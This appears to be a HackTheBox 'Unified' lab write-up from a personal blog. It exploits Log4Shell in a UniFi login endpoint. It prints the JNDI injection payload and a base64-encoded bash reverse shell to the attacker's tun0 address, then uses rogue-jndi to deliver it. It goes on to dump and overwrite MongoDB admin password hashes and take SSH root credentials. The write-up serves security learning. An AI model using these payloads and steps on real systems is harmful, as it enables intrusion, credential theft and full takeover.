+<p>This <a href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" target="_blank" rel="noopener noreffer ">blog</a> is written by two talented person <a href="https://twitter.com/ippsec" target="_blank" rel="noopener noreffer ">ippsec</a> &amp; <a href="https://twitter.com/0xdf" target="_blank" rel="noopener noreffer ">0xdf</a></p>
+<p>Enough with all that, Let&rsquo;s test it. First I&rsquo;m gonna fire up the <code>burpsuite</code> to <code>intercept</code> the <code>/api/login</code> endpoint. So, I can alter the request to be specific the <code>&quot;remember&quot;</code> parameter. Now, I need to put this payload :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">jndi</span><span class="o">:</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//Tun0 IP Address/test}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>JNDI</strong> (<code>Java Naming and Directory Interface API</code>). By making calls to this API, applications locate resources and other program objects.</p>
+<p><strong>LDAP</strong> <code>(Lightweight Directory Access Protocol</code>) The default port that LDAP runs on is <code>port 389</code>.</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/burpsuite.png"
+        data-srcset="/posts/htb/unified/burpsuite.png, /posts/htb/unified/burpsuite.png 1.5x, /posts/htb/unified/burpsuite.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/burpsuite.png"
+        title="1" width="608" height="375" /></p>
+<h2 id="tcpdump">tcpdump</h2>
+<p>Before sending the payload. First, let&rsquo;s set up the monitoring network on port 389 with <code>tcpdump</code>. This tool will let us monitor the network traffic/dump the network. So, open up another terminal and type:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo tcpdump -i tun0 port <span class="m">389</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the tcpdump has been started, click the <code>Send</code> button.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/tcpdump.png"
+        data-srcset="/posts/htb/unified/tcpdump.png, /posts/htb/unified/tcpdump.png 1.5x, /posts/htb/unified/tcpdump.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/tcpdump.png"
+        title="1" width="1257" height="164" /></p>
+<p>The tcpdump output shows a connection being received on my machine. This proves that the application is vulnerable since it is trying to connect on the LDAP port 389.</p>
+<h2 id="rogue-jndi">Rogue JNDI</h2>
+<p>Rogue JNDI is a malicious LDAP server for JNDI injection attacks. This will help me to receive connections back and execute malicious code. First, let&rsquo;s clone the Github repos of this application.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/veracode-research/rogue-jndi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/git_clone.png"
+        data-srcset="/posts/htb/unified/git_clone.png, /posts/htb/unified/git_clone.png 1.5x, /posts/htb/unified/git_clone.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/git_clone.png"
+        title="1" width="696" height="218" /></p>
+<p>The <code>rogue-jndi</code> is a Java application. In the <code>official walkthrough</code>. It says we need to install <code>Open-JDK</code> &amp; <code>Maven</code> on our system to build the payload.
+However, if you&rsquo;re using the Linux hacking distribution such as <code>parrot os</code> &amp; <code>kali</code>. You might have already installed it in those systems but if you don&rsquo;t. Type this to install it make sure to run it with sudo privilege.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="c1"># update the package </span>
+</span></span><span class="line"><span class="cl">sudo apt install openjdk-11-jdk -y <span class="c1"># install open-jdk</span>
+</span></span><span class="line"><span class="cl">sudo apt install maven <span class="c1"># install maven</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After all, is done, let&rsquo;s build the <code>Rogue-JNDI</code> Java application.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> rogue-jndi <span class="o">&amp;&amp;</span> mvn package
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/build-success.png"
+        data-srcset="/posts/htb/unified/build-success.png, /posts/htb/unified/build-success.png 1.5x, /posts/htb/unified/build-success.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/build-success.png"
+        title="1" width="1099" height="225" /></p>
+<h2 id="create-a-reverse-shell-payload">create a reverse shell payload</h2>
+<p>This will create a <code>.jar</code> file in <code>rogue-jndi/target/</code> directory called <code>RogueJndi-1.1.jar</code>. Before we can run the application. We need to create our reverse shell payload first and encode it with base64 to prevent any encoding issues.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜ <span class="nb">echo</span> <span class="s1">&#39;bash -c bash -i &gt;&amp; /dev/tcp/Tun0 IP/Port 0&gt;&amp;1&#39;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl"><span class="nv">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwL1R1bjAgSVAvUG9ydCAwPiYxCg</span><span class="o">==</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="rogue-jndi-arguments">rogue-jndi arguments</h2>
+<p>After the payload had been created, start the <code>Rogue-JNDI</code> application with these arguments. <code>Example down below</code>;
+Make sure to run the Netcat listener on your desire/reverse_shell port to catch the connection back.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  java -jar rogue-jndi/target/RogueJndi-1.1.jar --command <span class="s2">&#34;bash -c {echo,BASE64 STRING}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span class="s2">&#34;Tun0 IP Address&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/rogue-jndi-argv.png"
+        data-srcset="/posts/htb/unified/rogue-jndi-argv.png, /posts/htb/unified/rogue-jndi-argv.png 1.5x, /posts/htb/unified/rogue-jndi-argv.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/rogue-jndi-argv.png"
+        title="1" width="1263" height="365" /></p>
+<p>Going back to <code>burpsuite</code>. Let&rsquo;s intercept the requests once more but this time the payload going to be this instead; <br>
+After the payload is already set in place. Now, just click a single button it is the <code>Send</code> button &amp; BINGO!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">jndi</span><span class="o">:</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//Tun0 IP Address:1389/o=tomcat}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/nc.png"
+        data-srcset="/posts/htb/unified/nc.png, /posts/htb/unified/nc.png 1.5x, /posts/htb/unified/nc.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/nc.png"
+        title="1" width="638" height="202" /></p>
+<h2 id="upgrade-shell-using-script">upgrade shell using script</h2>
+<p><em><font color="yellow">type this command to upgrade shell:</font></em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="mongodb">mongoDB</h2>
+<p>In this article <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi" target="_blank" rel="noopener noreffer ">sprocketsecurity - another log4j on the fire unifi</a>. it says the <code>MongoDB</code> instance storing all application is listening on localhost <code>without authentication</code>. This means we can extract the password, alter the data, add our password to it, etc.</p>
+<h2 id="checking-mongodb-is-running">checking mongoDB is running</h2>
+<p>Just type this command on the victim machine. The output shows us <code>MongoDB</code> is running on the victim machine on <code>port 27117</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps aux <span class="p">|</span> grep mongo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/checking-mongodb.png"
+        data-srcset="/posts/htb/unified/checking-mongodb.png, /posts/htb/unified/checking-mongodb.png 1.5x, /posts/htb/unified/checking-mongodb.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/checking-mongodb.png"
+        title="1" width="1264" height="240" /></p>
+<p>Well, in the article <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi" target="_blank" rel="noopener noreffer ">sprocketsecurity - another log4j on the fire unifi</a> it talks about cracking the password hash and adding our <code>x_shadow</code> admin but in the <code>official walkthrough</code> did a kinda similar thing but in a more simple way. In this case, you can learn every way to interact or alter the data in <code>MongoDB</code>. I already trying them both but in this writeup, I choose the <code>official walkthrough</code> way to make it not a super long writeup.</p>
+<p>In the <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi" target="_blank" rel="noopener noreffer ">sprocketsecurity - another log4j on the fire unifi</a> article. I saw that they interact with the <code>UniFi</code> database called <code>ace</code>. So, I&rsquo;m thinking let&rsquo;s try it with the <code>ace</code> database and that&rsquo;s the correct DB name. <br>
+<em><font color="yellow">ace is the default UniFi database</font></em></p>
+<h2 id="dump-userpassword-from-mongodb">dump user/password from mongoDB</h2>
+<p>We already know MongoDB exist in victim machine. Now, we can dump user/password from it with this command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mongo --port <span class="m">27117</span> ace --eval <span class="s2">&#34;db.admin.find().forEach(printjson)&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/admin-hash.png"
+        data-srcset="/posts/htb/unified/admin-hash.png, /posts/htb/unified/admin-hash.png 1.5x, /posts/htb/unified/admin-hash.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/admin-hash.png"
+        title="1" width="1256" height="480" /></p>
+<p>After we press <code>Enter</code>. The output is so ridiculous its dumps all users, email, password hash, etc. The most important data we want to take a look at is <code>administrator</code>.</p>
+<h2 id="change-administrator-x_shadow">change administrator x_shadow</h2>
+<p>So, as I said before, I&rsquo;m gonna use the <code>official walkthrough</code> way to change administrator <code>x_shadow</code> but again it is up to you. How you want to approach it.
+Well, the first thing we want to do is generate a <code>sha-512</code> hash. To do this we can use the <code>mkpasswd</code> command-line utility. So, the command should look like this:</p>
+<h2 id="generate-sha-512-hash">generate sha-512 hash</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkpasswd -m sha-512 yourdesirepassword
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/mkpasswd.png"
+        data-srcset="/posts/htb/unified/mkpasswd.png, /posts/htb/unified/mkpasswd.png 1.5x, /posts/htb/unified/mkpasswd.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/mkpasswd.png"
+        title="1" width="1183" height="237" /></p>
+<p>Let&rsquo;s proceed to replacing the existing hash with one we created. To do it, type this command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mongo --port <span class="m">27117</span> ace --eval <span class="s1">&#39;db.admin.update({&#34;_id&#34;:ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;:&#34;SHA-512 Hash Generated&#34;}})&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/update-x_shadow.png"
+        data-srcset="/posts/htb/unified/update-x_shadow.png, /posts/htb/unified/update-x_shadow.png 1.5x, /posts/htb/unified/update-x_shadow.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/update-x_shadow.png"
+        title="1" width="1263" height="172" /></p>
+<p>Now, we need to verify that the password has been updated in the <code>MongoDB</code> by running the same command to dump the user/password. The hash appears to have been updated.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/noice.png"
+        data-srcset="/posts/htb/unified/noice.png, /posts/htb/unified/noice.png 1.5x, /posts/htb/unified/noice.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/noice.png"
+        title="1" width="1264" height="514" /></p>
+<h2 id="login-page">login page</h2>
+<p>Well, let&rsquo;s try login with the username <code>administrator</code> and password to whatever you put it as the hash. In my case, it will be <code>drjohn</code>. DONE!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/login_s_admin.png"
+        data-srcset="/posts/htb/unified/login_s_admin.png, /posts/htb/unified/login_s_admin.png 1.5x, /posts/htb/unified/login_s_admin.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/login_s_admin.png"
+        title="1" width="1259" height="581" /></p>
+<h2 id="steal-ssh-creds">steal SSH creds</h2>
+<p>The Nmap scan result previously shows that <code>port 22/SSH</code> is open. To gain access through SSH we must need a valid credential. However, luck is on our side. We can grab ssh credentials by navigating to the setting page by clicking the bottom left button that looks like a gear. Then, scroll down.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/stel_ssh.png"
+        data-srcset="/posts/htb/unified/stel_ssh.png, /posts/htb/unified/stel_ssh.png 1.5x, /posts/htb/unified/stel_ssh.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/stel_ssh.png"
+        title="1" width="1155" height="690" /></p>
+<h2 id="ssh-as-root">ssh as root</h2>
+<p>Let&rsquo;s log in as root with the creds we found. SUCCESS!!!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/root_ssh.png"
+        data-srcset="/posts/htb/unified/root_ssh.png, /posts/htb/unified/root_ssh.png 1.5x, /posts/htb/unified/root_ssh.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/root_ssh.png"
+        title="1" width="870" height="499" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 19-02-2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/unified/" data-title="HackTheBox - Unified Writeup" data-via="_shafiqaiman_" data-hashtags="CVE-2021-44228,unifi-6.4.54,log4j,tcpdump,rogue-jndi,mongodb-checking-is-running,mongodb-dump,mongodb-update,generate-sha512-hash,upgrade-shell-using-script"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/unified/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/unified/" data-title="HackTheBox - Unified Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/unified/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve-2021-44228/">CVE-2021-44228</a>,&nbsp;<a href="/tags/unifi-6.4.54/">unifi-6.4.54</a>,&nbsp;<a href="/tags/log4j/">log4j</a>,&nbsp;<a href="/tags/tcpdump/">tcpdump</a>,&nbsp;<a href="/tags/rogue-jndi/">rogue-jndi</a>,&nbsp;<a href="/tags/mongodb-checking-is-running/">mongodb-checking-is-running</a>,&nbsp;<a href="/tags/mongodb-dump/">mongodb-dump</a>,&nbsp;<a href="/tags/mongodb-update/">mongodb-update</a>,&nbsp;<a href="/tags/generate-sha512-hash/">generate-sha512-hash</a>,&nbsp;<a href="/tags/upgrade-shell-using-script/">upgrade-shell-using-script</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/vaccine/" class="prev" rel="prev" title="HackTheBox - Vaccine Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Vaccine Writeup</a>
+            <a href="/posts/htb/timelapse/" class="next" rel="next" title="HackTheBox - Timelapse Writeup">HackTheBox - Timelapse Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
